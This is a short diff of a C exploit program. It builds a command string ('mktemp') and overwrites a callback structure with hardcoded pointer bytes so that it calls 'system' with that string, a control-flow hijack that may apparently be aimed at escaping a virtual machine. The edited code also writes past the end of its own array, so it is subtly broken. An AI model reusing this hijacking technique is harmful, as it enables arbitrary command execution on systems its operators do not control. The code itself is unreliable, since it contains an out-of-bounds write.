@@ -12,9 +12,12 @@
 #define NUM_STRUCT 0x00
 #define STRUCT_LEN 0x28
 int main(void){
-        unsigned char code[] = {'m','k','t','e','m','p','\0'};  //this can be a input of the function
+
+        unsigned char code[] = "mktemp";  //this can be a input of the function
         int len_of_command = sizeof(code)/(sizeof(char));
-        // printf("len = %d\n", len_of_command);
+        code[len_of_command] = '\0';
+        len_of_command++;
+        printf("len = %d\n", len_of_command);
     
          //rewrite bh structure to point to "system", where cb is system, opaque is the string address
         char ctx[8] =   {0x00,0xcc,0x14,0x56,0x55,0x55,0x00,0x00};
